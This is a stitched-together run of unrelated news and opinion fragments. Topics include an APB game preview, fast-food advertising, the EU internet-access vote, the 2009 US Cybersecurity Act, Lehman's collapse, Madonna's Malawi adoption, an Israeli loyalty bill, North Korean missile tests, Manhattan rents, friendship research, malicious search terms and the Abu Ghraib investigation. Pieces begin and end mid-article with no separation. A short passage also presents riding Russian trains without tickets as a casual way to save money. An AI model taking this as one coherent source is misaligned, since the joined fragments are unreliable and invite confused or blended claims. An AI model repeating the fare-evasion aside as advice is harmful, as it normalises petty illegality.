We were shown a couple of copyright infringing tunes that they ’d made using the software ( which will be an interesting thing to follow when the game comes out – it ’s hard to see how the money - grabbing horrors in the various music industries wo n’t try and stamp their fat , stupid boots all over this ) that demonstrated its capabilities .
You can go so far as to create your own gloat tune , that will be heard by any player you kill .
There ’s a reason for all this , beyond just being incredibly cool .
One of the key elements of APB is to be celebrity .
The idea is that everyone playing can become famous for something .
It might be that you ’re the best at head shots .
Or it might be that you get killed the most often .
And with the auction house that will let you sell designs , decals , tattoos , etc for in - game money , you might become the most famous leather jacket designer .
You may become known as the best at creating tattoos .
This fame serves to further distinguish you , further create a notorious character .
The game ?
The game itself ?
This is where the truly astonishingly clever ideas appear .
You ’ll either play as a Criminal or an Enforcer .
Each has a distinct style of play , and neither will ever have to sit in a lobby waiting for a game to play .
With an intended 100 players on each server , the enormous city is also populated by NPCs who will play critical roles .
Firstly they will serve as the city ’s initial gangs , and give missions to players .
Secondly , and far more interestingly , they also provide the means by which the game ’s natural action flows .
So let ’s say you ’re playing as a Criminal .
You log into the city and want something to do right away .
Why not steal a car ?
You may well get away with it .
Take it out and go for a joyride , look for some trouble .
Or you may not – you may get spotted by an NPC who will report the APB .
Report it to other players playing as Enforcers .
Who then come chasing after you .
Or perhaps you ’re an Enforcer and you hear word of a bank that ’s moving some money .
They need security , so you show up to where it ’s happening .
But Criminals may get wind of this and attempt to steal that money during its journey .
The result of this is the game naturally creating PvP missions for players without ever having to throw up a quest screen , or have you sit around waiting for a match .
It ’s just so smart .
It means they ’ve replaced AI players from the game with real world players .
These matches are asymmetrical .
If you ’re especially good , especially well equipped and known by the game to be part of an especially dangerous gang , it ’s not going to send a couple of newbs after you .
It ’s going to report your crime to players who will present a challenge to you .
This might mean it matches up two gangs of equal strengths .
But it might just as easily send in a larger number of poorer players .
And this will escalate .
Say your gang of three manages to take out the three players it sent after you , it might then send five to get you .
Then it might alert two gangs , then three .
Keep winning and it will keep raising the challenge .
The notion behind this is it rewards both sides .
The players seeing the game send a dozen opponents after them will recognise the respect the game is showing them .
The group of twelve sent after the gang of three will love the fact they ’re so seemingly outnumbering their opponents .
Recognition will also be rewarded in terms of material goods .
Do especially well in a city and you may be able to buy real estate .
These buildings will be as customisable as everything else in the game , letting you apply your decals and colours to the walls , so everyone knows whose gang they belong to .
You might even receive statues .
When I asked Jones how this would work with only limited space on a server , and the likelihood of having to play in a different city when one was full , he suggested that this was mostly tough luck , although there would be some rewards so great that they would “ ripple ” onto multiple servers .
Balance of such a game is clearly crucial , and this is something they ’re still working on .
The current ideas are to make it impossible to shoot players who are n’t involved in the mission , but to still let anyone run anyone else over with a vehicle .
The logic behind this is to ensure the matchmaking is n’t defeated by griefing or drivebys , but Realtime acknowledge some will disagree .
In response to this , they plan to have “ chaos servers ” , where all such rules shall be removed , including the inability to carjack another player ’s car .
It seemed that the main reason they intended to do this was to prove to anyone who was complaining what a bad idea it would be , and give them somewhere to find out .
Blimey , there ’s so many more details to report .
Let ’s do music in the game .
Jones said how most open city games tend to come with about 100 licensed tracks , but that they realised that most players would far rather listen to their own mp3 collection .
But this is an online game .
So they ’ve done a deal with Last .
FM to use their technology in such a brilliantly imaginative way .
If you ’re listening to a favourite track in your car , and drive past some other players , should they have the same track on their hard drive the game will find it , and they ’ll hear it from your car as you go by .
Should they not have it , the game will find a track that ’s similar and play that instead .
The same logic applies to the in - game VOIP .
If you ’re chatting with your gang via headsets and another player walks by , they ’ll hear what you ’re saying .
Using 3D positioning , these voices will appear realistically far away , getting louder as you approach .
This barrage of ideas , the attempt to put everything in the hands of the player , only falls short in one area : mission design .
At launch all the prescribed missions will come from NPCs .
But again , this is not intended to last .
Realtime have desires to allow the most successful gangs , those that gain the most notoriety , to eventually become those who design and distribute missions to other players .
If there ’s a criticism to be levelled at the game at this stage it ’s the sparse nature of the backgrounds .
While the characters and cars look remarkable , most of the scenery we saw was bland and grey .
Hopefully more interesting locations will be revealed as time goes on .
But beyond this , APB looks just jaw - dropping in everything from its design intricacy to its revolutionary approach to matchmaking in an MMO world .
It makes PvP seem appealing to someone as single - player minded as me , and that ’s a hefty achievement from within my head .
It ’s such a wealth of ideas in one game , that we ca n’t wait to get our hands on .
When I watch the Carl ’s Jr. commercial featuring “ Top Chef ” host and mega - model Padma Lakshmi make hot sweet love to a Western Bacon Cheeseburger , I have many thoughts , some of which , I confess , are not entirely to my credit .
The spot features the former Mrs. Salman Rushdie sitting on a brownstone stoop in a clingy sundress hiked up mid-thigh , cramming the giant burger into her educated maw and sucking barbecue sauce from her fingers and wrists .
Let ’s not mince onions here :
This is sex with a burger .
You might think that here , at last , television advertising might have crossed some sort of debauched Rubicon , or at least some tripwire at the Federal Communications Commission .
Not even close .
It ’s merely the latest chapter in the weird mash - up between sex and diabolically unhealthful fast food .
What gives ?
If my cultural antenna does n’t fail me , the mood of the country is slightly more relaxed about sexual matters .
Global economic crisis tends to put provincialism on the back burner .

Not only that , fast food has a huge image problem .
This is the bottom rung of America ’s food chain .
Prescribed use of fast food makes you undesirable .
The Western Bacon Cheeseburger from Carl ’s Jr. , for instance , has 720 calories , 33 grams of fat and 1,410 milligrams of sodium , a veritable pillar of biblical salt .
The Carl ’s Jr. commercial , from Mendelsohn Zien Advertising in Los Angeles , is in heavy rotation this month with a duplicate for corporate cousin Hardee ’s that ’s running in Eastern markets .
The ads reunite Mendelsohn Zien and director Chris Applebaum , who created the 2005 commercial with a nearly naked Paris Hilton lathering up a Bentley .
Applebaum also directed the 2007 campaign for Carl ’s Jr. flat - bun burgers , featuring a hip - hop duo serenading their high school teacher ’s flat butt -- her badonkado n’t , if you will .
All future correspondence to Mendelsohn Zien and Applebaum should be addressed to the Eighth Circle of Hell .
I cannot pretend to be offended by these ads .
Young men are coarse , callow , emotional imbeciles with suicidal dietary habits .
In other words , from a marketing perspective , these ads are perfection itself , practically verite .
Meanwhile , if I put on my magic deconstructing spectacles , I can see neo -feminist subversion in these messages .
Note the tagline of the Padma Lakshmi commercial : “ More than a piece of meat . ”
This was the cri de coeur of feminism back in the day , and though it refers to the burger , it is also a tweak of conscience to males slobbering over the accomplished actress - author - chef .
Take that , you objectifying pig .

Also , in a culture in which glamour and beauty have been so thoroughly yoked to anorexia , is n’t it great to see a sexy woman eat like a stevedore ?
So , good for Carl ’s Jr. Its advertising has found its voice , its groove , its gimmick .
It has a style in which the male is both hero and buffoon .
The trouble arises as other fast - food outfits attempt to rise , or sink , to Carl ’s Jr. 's new standard of loutishness .
Consider the new Quiznos ad for Toasty Torpedo sandwiches ( Nitro ) .
This one ’s a little hard to describe but it appears that Scott , a Quiznos baker , has had some kind of dangerous liaison with the oven , which speaks to him : “ Scott , I want you to do something , ” the oven says in a husky male voice .
“ I ’m not gonna do that again , ” Scott says .
“ That burned . ” “ We both enjoyed that , ” the oven answers .
The oven then demands that Scott make a foot - long Toasty Torpedo and -- I quote -- “ Put it in me , Scott . ”
Umm , check please , waiter .

Not to be left out , Burger King drew fire this month for its oddly sexualized ad promoting its 99 - cent SpongeBob SquarePants Kids Meal ( Crispin Porter + Bogusky ) , which involves the King riffing to Sir Mix - a - Lot ’s “ Baby Got Back ” while a bunch of orthogonally rumped hotties dance around .
The King likes square butts , apparently .
“ It ’s bad enough when companies use a beloved media character like SpongeBob to promote junk food to children , but it ’s utterly reprehensible when that character simultaneously promotes objectified , sexualized images of women , ” fumed Susan Linn , the director of Campaign for a Commercial - Free Childhood .
Any minute now , Ronald McDonald is going to mount a stripper pole .
Sex and fast food .
Theories , anyone ?
For one thing , these ads target a young audience , digital natives who have had their normative values defined by life online , which is generally pretty risque ( I have no doubt there is a man - on - toaster website out there ) .
For another , humor is about the only defense advertisers have against the commercial - skipping fast - forward button on the DVR .
And sex is , on a cosmic level , pretty hilarious .
Advertisement
But mainly , fast - food advertisers know their products are singularly , dangerously unsexy .
Quiznos ’ Tuna Melt ( large ) , at 2,090 calories , was just voted Worst Sandwich in America by Men ’s Health .
If you eat a lot of those , you ’ll get fat and smell strange , and nobody will want to have sex with you .
The sexualization of fast food takes us down the same path of old cigarette advertising that showed doctors , athletes and cowboys smoking like crazy and living active , aerobically challenging lives ; or beer commercials , in which everybody is as sleek as ferrets .
These products have definite , measurable health consequences , and it ’s the job of the advertising ’s imagery to push these consequences as far offstage as possible .
And so you have the impossibly lean and beautiful Lakshmi wolfing down a 1,000 - calorie burger .
Now that ’s hard to swallow .

In a last - minute show of defiance over citizens ' right to internet access , the European Parliament has rejected a deal on a bill that would have overhauled the telecommunications sector , delaying the legislation for months .
Strasbourg declined on Wednesday to ratify a compromise between its own representatives and those of the Council of Ministers , which represents the member states , on a wide - ranging telecoms package .
The bill focuses on changes to telecoms infrastructure , further liberalising the sector and creating an EU - level telecoms regulator .
But a battle has exploded in the last few weeks over a parliamentary amendment that aimed to prevent countries from passing legislation similar to France 's ‘ three - strikes ' bill that would cut off internet access if users are repeatedly caught downloading music , films and other content without permission of the copyright holder .
Smelling defence of internet access as a key vote - winner in next month 's European elections , particularly amongst the young , MEPs have repeatedly refused to budge on the issue , demanding that access can only be cut off by court order .
France , wanting to save what has become a flagship piece of legislation for President Nicholas Sarkozy , whose wife is a pop star , lobbied other member states heavily on the issue .
As EUobserver reported last week , a compromise deal reached between the two sides on Tuesday ( 28 April ) said that internet users had their internet access cut had a " right to a judgment by an independent and impartial tribunal . "
The language however was sufficiently ambiguous that both MEPs and France claimed victory .
Catherine Trautmann , the deputy responsible for shepherding the legislation through the parliament , said she was confident that the wording in the compromise meant that a court order was required before access could be cut .
French culture minister Christine Albanel meanwhile believed that the compromise meant that websurfers who had their internet access cut had a right to judicial appeal - but only after the deed had been done .
The deal unravelled on Wednesday morning however , when the full sitting of the parliament supported a late amendment 407 to 57 , with 171 abstentions , re-inserting stronger language requiring governments to obtain a court ruling before access can be cut .
Package delayed for months
The European Commission , which has supported the parliament 's view on internet access since throughout the legislative process , again strongly backed the result .
" This amendment is an important restatement of the fundamental rights of EU citizens , " said information society commissioner Viviane Reding .
" For many , it is of very high symbolic and political value .
I call on the Council of Ministers to assess the situation very carefully , also in the light of the importance of the telecoms reform for the sector and for the recovery of our European economy . "
Telecoms ministers are to meet on 12 June , where they must decide whether to accept the package as a whole , including the parliament 's amendment , or whether a ‘ conciliation ' process between the two sides and mediated by the commission will have to begin in the autumn .
Ms Reding said she would work closely with the current , Czech EU presidency to try to achieve an agreement in the next few weeks .
However , Ms Trautmann is all but certain that the Council will never agree to the package with the amendment included .
" The whole package will go to conciliation , " Ms Trautmann told the chamber after the vote .
The Council now has until September to respond with its own text and the parliament then has up to eight weeks to convene a conciliation committee .
The Council would then under the chairmanship of the next , Swedish EU presidency have to negotiate with a freshly elected parliament - which is certain to have greater numbers of internet freedom advocates than the current chamber .
This conciliation process itself may then take up to another eight weeks , the result of which would still then have to return to the full sitting of the parliament for a third reading .
Sources close to the deliberations believe it could be as late as February before a final decision is reached .
' Courageous '
The European Consumers ' Organisation , BEUC , regretted the delay to the legislation that the rejection will cause , but said it was worth it to prevent ‘ three - strikes ' - style legislation .
Monique Goyens , the group 's director - general , said : " Today 's vote is victory for consumers , " and called on the next parliament to explicitly prohibit " such draconian laws " .
La Quadrature du Net , a French internet freedoms pressure group , cheered the " courage " of MEPs .
" The strong statement for the access to the Internet as a fundamental right demonstrates that the parliament can be courageous and reject the pressure to compromise when essential values are at stake , " said Gérald Sédrati - Dinet , an analyst with the group .
There 's a new bill working its way through Congress that is cause for some alarm : the Cybersecurity Act of 2009 ( PDF summary here ) , introduced by Senators Jay Rockefeller ( D - WV ) and Olympia Snowe ( R - ME ) .
The bill as it exists now risks giving the federal government unprecedented power over the Internet without necessarily improving security in the ways that matter most .
It should be opposed or radically amended .
Essentially , the Act would federalize critical infrastructure security .
Since many of our critical infrastructure systems ( banks , telecommunications , energy ) are in the hands of the private sector , the bill would create a major shift of power away from users and companies to the federal government .
This is a potentially dangerous approach that favors the dramatic over the sober response .
One proposed provision gives the President unfettered authority to shut down Internet traffic in an emergency and disconnect critical infrastructure systems on national security grounds goes too far .
Certainly there are times when a network owner must block harmful traffic , but the bill gives no guidance on when or how the President could responsibly pull the kill switch on privately - owned and operated networks .
Furthermore , the bill contains a particularly dangerous provision that could cripple privacy and security in one fell swoop :
The Secretary of Commerce — shall have access to all relevant data concerning ( critical infrastructure ) networks without regard to any provision of law , regulation , rule , or policy restricting such access …
In other words , the bill would give the Commerce Department absolute , non-emergency access to “ all relevant data ” without any privacy safeguards like standards or judicial review .
The broad scope of this provision could eviscerate statutory protections for private information , such as the Electronic Communications Privacy Act , the Privacy Protection Act , or financial privacy regulations .
Even worse , it is n’t clear whether this provision would require systems to be designed to enable access , essentially a back door for the Secretary of Commerce that would also establish a primrose path for any bad guy to merrily skip down as well .
If the drafters meant to create a clearinghouse for system vulnerability information along the lines of a US / CERT mailing list , that could be useful , but that ’s not what the bill ’s current language does .
A privacy threat still in the cocoon is the provision mandating a study of the feasibility of an identity management and authentication program with just a nod to “ appropriate civil liberties and privacy protections . ”
There ’s reason to fear that this type of study is just a precursor to proposals to limit online anonymity .
But anonymity is n’t inherently a security problem .
What ’s “ secure ” depends on the goals of the system .
Do you need authentication , accountability , confidentiality , data integrity ?
Each goal suggests a different security architecture , some totally compatible with anonymity , privacy and civil liberties .
In other words , no one “ identity management and authentication program ” is appropriate for all internet uses .
Whether the bill is amended or rejected , the question remains what kind of actions would help cybersecurity , and what role the federal government has to play .
As security expert Bruce Schneier has pointed out , the true causes of government cyber - insecurity are rather mundane :
GAO reports indicate that government problems include insufficient access controls , a lack of encryption where necessary , poor network management , failure to install patches , inadequate audit procedures , and incomplete or ineffective information security programs .
The Cybersecurity Act is an example of the kind of dramatic proposal that does n't address the real problems of security , and can actually make matters worse by weakening existing privacy safeguards – as opposed to simpler , practical measures that create real security by encouraging better computer hygiene .
We ’ll be watching this bill carefully to ensure that it does n’t pass in its present form .
Mr. Walsh and his crew rushed to sell their inventory .
Between November 2007 and February 2008 , Lehman shed $ 2.8 billion of its commercial real estate exposure .
But that still left $ 36 billion of hard - to - value leftovers , including debt and equity from Archstone and SunCal .
Last spring , the hedge fund investor David Einhorn , who was shorting Lehman ’s stock , suggested that the bank ’s positions in Archstone and SunCal might be worthless .
Mr. Einhorn said share prices of Archstone ’s competitors had tumbled as much as 30 percent since the acquisition was announced .
As for SunCal , he pointed out that publicly traded home builders had written down their Southern California land holdings to “ pennies on the dollar . ”
Mr. Einhorn called for Lehman to take a multibillion - dollar write - down on its Archstone holdings .
Lehman said it was valuing its commercial real estate fairly , based on the prices that Mr. Walsh ’s group had been getting on the open market as it struggled to free up the bank ’s balance sheet .
Lehman ended up with $ 29 billion in commercial mortgage exposure on its books in the second quarter of 2008  30 percent more than Deutsche Bank and Morgan Stanley and 70 percent more than Goldman Sachs .
In early September , Lehman announced that it would stuff its toxic commercial mortgages into a new public company to be spun off to shareholders .
The idea went nowhere .
“ They could n’t get that commercial real estate off their books to save their lives , ” says Mr. Hintz at Sanford C. Bernstein .
In short order , Lehman collapsed .
SOON after Lehman ’s bankruptcy , a former executive who declined to be identified because he was n’t authorized to speak publicly about his time at the firm went to Mr. Walsh ’s office to talk .
But they sat in silence .
After two minutes , the executive left .
“ It became clear that neither one of us was going to say something that the other did n’t already know , or that we were going to actually have a new idea or bring greater clarity to the situation , ” he recalls .
Ultimately , Barclays scooped up part of Lehman ’s operations .
But it dismissed Mr. Walsh and most of his team .
Now the United States attorney ’s office and the New Jersey attorney general are trying to determine whether Mr. Walsh did anything wrong .

Advertisement A Malawian court has ruled that US pop star Madonna has failed in her bid to adopt a second child from the country .
" I must decline to grant the application for the adoption of the infant , " judge Esmie Chondo said after a closed - door hearing on Friday .
The application has been rejected over residency rules .
Madonna , who flew to Malawi on Sunday , was not in court to hear the ruling over Chifundo James , three .
Her lawyer said she would lodge an appeal .

The 50 - year - old singer applied to adopt Chifundo James , whose name translates into English as Mercy , on Monday .
Had her application been successful , Chifundo would have been a sister to David , the first child she adopted from the African country , and her biological children Lourdes and Rocco .
Chifundo is in the same orphanage that previously housed David , now three years old .
Trafficking concerns Madonna 's application was rejected because of a requirement that prospective parents be resident in the southern African state for 18 to 24 months .
To deny Chifundo James the opportunity to be adopted by me could expose her to hardship and emotional trauma which is otherwise avoidable
Madonna in newly - released court papers
Head to head : Madonna adoption
The rule was waived in 2006 when Madonna was allowed to take her adopted son , David Banda , to London before his adoption was finalised in 2008 .
In the ruling , read out outside the court , the judge also voiced concerns about the potential ramifications a ruling in Madonna 's favour might have on adopted children 's human rights .
" By removing the very safeguard that is supposed to protect our children , the courts by their pronouncements could actually facilitate trafficking of children by some unscrupulous individuals , " she said .
The judge also noted that Chifundo had been placed in one of Malawi's best orphanages and no longer suffered the severe poverty endured after her mother died in childbirth .
" It is evident that Chifundo James no longer is subject to the conditions of poverty at her place of birth , " she said in the ruling , made at the hearing in Malawi 's administrative capital Lilongwe .
HAVE YOUR SAY
Surely , once adopted , she could have gotten anything money can buy .
But is that really everything a child should receive ?
Esther , Belfast According to court papers just released , Madonna had said she was " able and willing to securely provide for Chifundo James and make her a permanent and established member of my family " .
" To deny Chifundo James the opportunity to be adopted by me could expose her to hardship and emotional trauma which is otherwise avoidable , " she continued .
However , Madonna 's efforts to adopt the three - year - old attracted criticism from some parties who said the little girl would be best off with relatives .
The performer was also accused of using her fame and money to fast - track the adoption process , a charge refuted by her spokeswoman Liz Rosenberg .
The singer , who was represented in court by her lawyer Alan Chinula , first travelled to Malawi in 2006 to film a documentary in the country .

Hard - line Israeli party proposes loyalty bill which would force Arabic community to swear allegiance to Jewish state
Israel 's Arabic population would be forced to swear loyalty to the Jewish state or risk severe punishment , under new legislation proposals .
An ultranationalist party headed by the Israeli foreign minister said today it has prepared a bill linking citizenship to an oath of allegiance .
The bill follows a separate proposal yesterday by the same party that would make it illegal for Arabs to mourn the ' catastrophe ' - the term Palestinians use to describe their defeat and exile in the war that surrounded Israel 's founding .
Controversial : Israel 's Foreign Minister Avigdor Lieberman has proposed new legislation that would force Palestinians to swear allegiance to the Jewish state
Both proposals by Foreign Minister Avigdor Lieberman 's Yisrael Beitenu party focus on the perceived disloyalty of the country 's Arab citizens , roughly one - fifth of Israel 's population of 7 million .
The loyalty oath was one of the central planks in Lieberman 's campaign for parliamentary elections in February .
His prominent role in Israel 's new government has given it a clear hard - line tilt and fuelled international concerns about Israel 's willingness to pursue peace with the Palestinians .
The legislation , which must still pass several hurdles to win final approval , drew harsh criticism from opposition legislators and civil rights groups .
Mohammed Darawshe of the Abraham Fund Initiatives , which works for coexistence between Jews and Arabs in Israel , said the bills reflect 'an ideology imported from dark regimes that have collapsed . '
Yisrael Beitenu swept to third place in the February elections with a message that suggested Israel 's Arabs were an internal threat to the country .
Largely supported by Israelis who , like Lieberman , are immigrants from the former Soviet Union , it is a senior partner in the coalition government .
Conflict : Right - wing Israeli youth stop their flag march through the Moslem Quarter of the Old City in Jerusalem last week as they intimidate Palestinians
The party says it will present its proposed loyalty oath to a ministerial committee for preliminary approval on Sunday .
The legislation would make citizenship contingent on an oath of loyalty to Israel as a ' Jewish , Zionist and democratic state , ' party spokesman Tal Nahum said .
The bill would also allow the government to revoke the citizenship of anyone who does not comply or perform some form of military or national service .
Israel 's prime minister , Benjamin Netanyahu , has yet to express a position on the matter .
The party 's announcement came a day after it introduced a bill that would outlaw Arab demonstrations mourning their defeat and exile in the war surrounding Israel 's establishment in 1948 .
The bill received preliminary approval to go ahead but still needs to pass repeated readings in parliament before becoming law .
The bill would hand three years in prison to anyone who participates in public protests or commemorations .
Israel 's prime minister , Benjamin Netanyahu , has yet to express a position on the legislation proposals
Alex Miller , the lawmaker who sponsored the bill , told Army Radio : ' I think we can reach a situation in which citizens of our country will not mark a day of mourning for the establishment of the country they live in . '
The bills do not appear to have enough support to win parliamentary approval .
Nonetheless , they drew furious reactions .
Arab lawmaker Hana Swaid called Miller 's bill ' racist , ' saying it 'eliminates the right of Palestinian Arab citizens to pronounce their identity and national feelings . '
Unlike Palestinians in the neighboring West Bank and Gaza Strip , Israel 's Arabs hold full citizenship rights , but they suffer from discrimination and have little identification with a country that defines itself as Jewish .
Ahmad Abdel Rahman , an aide to Palestinian President Mahmoud Abbas , said the Netanyahu administration is ' flailing in all directions - in its foreign policy , the peace process and even when it comes to the rights of its own citizens . '
The legislation is the latest move by the new Israeli government to anger the country 's Arab citizens and neighbors .
Netanyahu has taken a hard line toward the Palestinians , refusing to endorse Palestinian independence and ruling out any Israeli withdrawal from east Jerusalem .
The Palestinians hope to make east Jerusalem the capital of a future independent state alongside Israel .
On Sunday , a Palestinian official encouraged Palestinians to buy homes in Jewish neighborhoods in east Jerusalem as a way of strengthening the Arab presence in the disputed city .
Hatem Abdel Qader , minister of Jerusalem affairs , said that buying homes was 'a means of defending Jerusalem . '
Israel captured east Jerusalem in the 1967 Mideast war and immediately annexed the land , a move never recognized by the international community .
A number of large Jewish neighborhoods now stand in east Jerusalem .
Some Arab families have begun moving into Jewish neighborhoods , where municipal services tend to be better .
Today , Israeli aircraft scattered leaflets over the Gaza Strip warning residents to stay away from the border , saying they risk being shot .
The military has scattered similar warning leaflets in the past .
Gaza 's Health Ministry said a 10 - year - old boy was wounded when he was struck by one of the parachute - equipped metal canisters that hold the leaflets .
SEOUL ( Reuters ) - North Korea defied international condemnation of its latest nuclear test by firing three short - range missiles off its coast on Tuesday and major powers considered tougher action against the isolated communist state .
With tension in the region high , South Korea said it would join a U.S. - led initiative to intercept ships suspected of carrying weapons of mass destruction , something Pyongyang has warned it would consider a declaration of war .
South Korea ’s Yonhap news agency quoted a government source in Seoul as saying the North had test - fired one surface - to - air and one surface - to - ship missile off its east coast .
The missiles had a range of about 130 km ( 80 miles ) .
Yonhap later reported that Pyongyang had fired a third short - range rocket on Tuesday .
North Korea also fired three short - range missiles on Monday and South Korean media quoted government sources as saying further missile tests were possible .
Monday ’s nuclear test , the North ’s second after one in 2006 , drew sharp international condemnation and U.S. President Barack Obama said Pyongyang ’s nuclear arms program threatened international security .
The nuclear test raised concern about North Korea spreading its weapons to other countries and groups .
The United States has accused it of trying try to sell nuclear know - how to Syria and others .
“ Another risk is that the North Koreans might peddle some plutonium , or peddle some technology to terrorist groups , that would also be very , very serious , ” Hans Blix , former head of the International Atomic Energy Agency , told the BBC .
Obama assured South Korean President Lee Myung - bak of Washington ’s unequivocal commitment to defense on the divided peninsula , where some two million troops face off .
UN RESOLUTION “ WITH TEET H ”
North Korea ’s actions took a toll on Seoul ’s jittery financial markets , fearing the impact of its growing belligerence in a region which accounts for a sixth of the global economy .
South Korean stocks and the won currency wobbled for a second day , with the main KOSPI share index ending the day more than 2 percent lower .
The won fell almost one percent against the dollar , although many traders said the market was becoming less concerned by North Korea .
In New York , ambassadors from the five permanent members of the United Nations Security Council plus Japan and South Korea met to work on resolution meant to add pressure to Pyongyang to rein in its nuclear program .

After the meeting , U.S. Ambassador to the United Nations Susan Rice told reporters that negotiations on a resolution “ will indeed take some time . ”
She told CNN that Washington wanted “ a strong resolution with teeth ...
Those teeth could take various different forms .
They are economic levers , they are other levers that we might pursue . ”
U.S. State department spokesman Ian Kelly said North Korea would “ pay a price ” if it did not reverse its course but said the door was still open for it to resume long - running six - party talks meant to draw the reclusive state out of its isolation .

A U.S. Treasury Department official said on condition of anonymity that Washington was “ reviewing our options ” for further financial sanctions against Pyongyang .
There is little more Washington can do to deter the North , which has been punished for years by international sanctions and is so poor that it relies on aid to feed its 23 million people .
U.N. diplomats said it was clear that China , a veto - wielding permanent council member , opposed new penalties but might accept demands for tougher enforcement , and possibly an expansion , of existing sanctions .
So far only the French delegation has publicly called for new U.N. sanctions .
PYONGYANG BLAMES U.S .
Pyongyang said the United States was the aggressor , its usual justification for making nuclear arms .
“ Our army and people are fully ready for battle ... against any reckless U.S. attempt for a preemptive attack , ” said its KCNA news agency .
Analysts say Pyongyang ’s military grandstanding was partly aimed at tightening leader Kim Jong - il ’s grip on power so he can better engineer his succession .
Many speculate he wants his third son to take over .
For China , an immediate concern is a possible breakdown of order inside the ostracized state , which could send a flood of North Korean refugees across its border .
China is believed to want to bring North Korea back to the six - party talks , also involving South Korea , Japan , the United States and Russia , to make it give up a nuclear weapons program in return for aid and an end to its years as a pariah state .
Analysts say North Korea , which now spurns those talks , wants to use its nuclear muscle as leverage in dealing with Washington .
A North Korean diplomat told the 65 - nation U.N. - sponsored Conference on Disarmament in Geneva that denunciations of its nuclear test could prevent it from supporting the group ’s moves to curb production of nuclear bomb - making material , jeopardizing the start of global talks on the issue .
A number of analysts said 67 - year - old leader Kim , who is widely thought to have suffered a stroke last year , hopes his defiant weapons tests will help him secure support from the hard - line military for his chosen successor .
Kim was named successor by his father and the country ’s founding president Kim Il - sung , but has carefully avoided putting any of his three sons in the limelight .
But since those generous bonuses helped drive up apartment prices in past years , graduates with limited funds may actually benefit from the current weakness in the finance industry .
“ It ’s a great time to be a renter , ” said Gary Malin , the president of Citi Habitats , which specializes in Manhattan rentals , but also has listings in Brooklyn and Queens .
“ The vacancy rate is higher than it has been , and rents are down across the board . ”
In Manhattan , where the average rent for a studio is $ 1,774 , many landlords are offering to pay brokers ’ fees .
Some are also throwing in a month or two of free rent .
Rents in some buildings have dropped by 20 percent from last year .
But prices in Harlem , Brooklyn and Queens  places where people priced out of many Manhattan neighborhoods have long gone for better value  have not decreased as much , Mr. Malin said .
The new arrivals can learn from the experiences of those who arrived a year or two ago , and have figured out how to navigate the rental market here , which can be bewildering to outsiders .

Cailin McDuff and her two roommates , Katie Nagrotsky and Jessica Bolen , decided to share a three - bedroom apartment in Hamilton Heights , a historic section of Harlem roughly between 132nd and 153rd Streets west of St. Nicholas Avenue .
All three are public school teachers in their first year with Teach for America ; each makes an annual salary of about $ 45,000 .
They split $ 2,195 in rent for three bedrooms and a living room large enough to have 20 of their closest friends over for a picnic dinner .
Their apartment is a fifth - floor walk - up , but it has hardwood floors , exposed brick walls , an up - to - date kitchen with stainless - steel appliances , and what all three women refer to as their “ pride and joy ”  a combination washer / dryer in the renovated bathroom .
Are you going travel to Russia .
Would you like to buy Russian train tickets ?
Well you do n’t need to if you want to feel yourself for a moment Russian .
Trainhiking is very common , some do it for fun some for just saving the ticket price .
You may have more Facebook friends as the years go by , but when it comes to your close friends , you lose about half and replace them with new ones after about seven years , new social research suggests .
As a result , the size of your social network stays about the same .
People might like to think they have control over whom they choose as friends , but social networks could also be influenced by the context in which we meet one another .
Sociologist Gerald Mollenhorst of Utrecht University in the Netherlands was interested in finding out exactly how much our networks are shaped by social context or by personal preference .
He conducted a survey of 1,007 people ages 18 to 65 , and then contacted the participants seven years later .
From the original group , 604 people were re-interviewed .
The survey contained questions such as : Who do you talk with , regarding personal issues ?
Who helps you with DIY in your home ?
Who do you pop by to see ?
Where did you get to know that person ?
And where do you meet that person now ?
The results showed that personal network sizes remained stable , but that many members of the network were new .
About 30 percent of discussion partners and practical helpers had the same position in a typical subject 's network seven years later .
And only 48 percent were still part of the network .
This finding goes against previous research which had showed that social network sizes are shrinking .
Mollenhorst also established that networks were not formed based on personal choices alone .
Our friend choices are limited by the opportunities to meet .
He saw that people frequently choose friends from a context in which they have previously chosen a friend .
Also , whether or not our friends know each other strongly depends on the context under which people meet .
Mollenhorst 's research is part of the project " Where friends are made .
Context , Contacts , Consequences , " set up by Beate Völker .

Many people use the " I do n't search for warez or porn " defense when it comes to avoiding malicious software and links online .
It turns out that the most dangerous search terms are often much more benign .
McAfee , of the anti-virus fame , had their researchers comb through thousands of popular keyword searches .
After analyzing the frequency with which they found malicious software at each link they compiled the results .
Surprisingly the common " bad " searchs that people associate with a guarantee of getting malicious software like searching for pirated software or pornography rank fairly low on the risk scale .
Apparently the people behind malicious sites like to cast a wide net and use things like lyrics to popular songs and free screen savers to lure people in .

“ I was n’t angry about what he said but disappointed that he would say that to me , ” Taguba said .
“ I ’d been in the Army thirty - two years by then , and it was the first time that I thought I was in the Mafia . ”
THE INVESTIGATION
Taguba was given the job of investigating Abu Ghraib because of circumstance : the senior officer of the 800th Military Police Brigade , to which the soldiers in the photographs belonged , was a one - star general ; Army regulations required that the head of the inquiry be senior to the commander of the unit being investigated , and Taguba , a two - star general , was available .
“ It was as simple as that , ” he said .
He vividly remembers his first thought upon seeing the photographs in late January of 2004 : “ Unbelievable !
What were these people doing ? ”
There was an immediate second thought : “ This is big . ”
Taguba decided to keep the photographs from most of the interrogators and researchers on his staff of twenty - three officers .
“ I did n’t want them to prejudge the soldiers they were investigating , so I put the photos in a safe , ” he told me .
“ Anyone who wanted to see them had to have a need - to - know and go through me . ”
His decision to keep the staff in the background was also intended to insure that none of them suffered damage to his or her career because of involvement in the inquiry .
“ I knew it was going to be very sensitive because of the gravity of what was in front of us , ” he said .
The team spent much of February , 2004 , in Iraq .
Taguba was overwhelmed by the scale of the wrongdoing .
“ These were people who were taken off the streets and put in jail — teen - agers and old men and women , ” he said .
“ I kept on asking these questions of the officers I interviewed : ‘ You knew what was going on .
Why did n’t you do something to stop it ? ’ ”
Taguba ’s assignment was limited to investigating the 800th M.P.s , but he quickly found signs of the involvement of military intelligence — both the 205th Military Intelligence Brigade , commanded by Colonel Thomas Pappas , which worked closely with the M.P.s , and what were called “ other government agencies , ” or O.G.A.s , a euphemism for the C.I.A. and special - operations units operating undercover in Iraq .
Some of the earliest evidence involved Lieutenant Colonel Steven L. Jordan , whose name was mentioned in interviews with several M.P.s .
For the first three weeks of the investigation , Jordan was nowhere to be found , despite repeated requests .
When the investigators finally located him , he asked whether he needed to shave his beard before being interviewed — Taguba suspected that he had been dressing as a civilian .
